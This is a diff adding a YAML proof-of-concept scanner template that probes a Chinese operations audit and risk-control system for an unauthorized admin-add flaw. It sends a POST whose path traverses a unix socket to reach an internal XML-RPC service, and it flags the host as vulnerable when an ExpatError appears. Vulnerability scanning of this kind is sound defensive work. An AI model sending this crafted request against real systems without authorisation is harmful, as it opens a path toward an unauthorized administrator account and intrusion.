@@ -1,0 +1,15 @@
+name: poc-yaml-arnhem-unauthorized-admin-add
+rules:
+  - method: POST
+    path: /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      123
+    expression: |
+      response.body.bcontains(b'xml.parsers.expat.ExpatError')
+detail:
+  description: arnhem-unauthorized-admin-add
+  links:
+    - app="安恒信息-明御运维审计与风险控制系统"
+    
